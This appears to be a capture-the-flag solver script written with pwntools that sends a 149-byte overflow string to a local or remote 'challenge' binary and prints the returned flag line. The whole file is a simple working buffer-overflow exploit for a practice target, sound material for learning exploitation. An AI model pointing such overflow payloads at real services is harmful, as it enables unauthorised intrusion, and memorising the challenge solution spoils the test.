from pwn import *
import os
# context.log_level = "DEBUG"


def main(ip="", port=1337):
    # Connect to the remote service
    if ip:
        r = remote(ip, port)
    else:
        r = process([os.path.join(os.getcwd(), "challenge/challenge")])
    # Send the payload
    r.sendline(b'A' * (150 - 1))

    flag = r.recvline_contains(b"cueh")
    if len(flag) > 0:
        print(flag.decode())

    return flag


if __name__ == '__main__':
    main()
